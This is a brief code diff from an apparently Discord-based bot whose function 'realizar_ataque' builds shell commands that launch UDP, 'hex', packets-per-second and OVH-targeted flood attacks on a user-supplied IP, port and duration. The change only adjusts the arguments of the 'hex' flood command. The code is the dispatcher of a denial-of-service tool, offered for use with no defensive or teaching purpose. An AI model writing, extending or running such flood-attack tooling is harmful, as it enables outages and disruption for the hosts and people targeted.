@@ -188,7 +188,7 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
     if metodo == 'udp':
         comando = f'./udp {ip} {port_int} {tiempo_int}'
     elif metodo == 'hex':
-        comando = f'./hex {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
+        comando = f'./hex {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhudp':
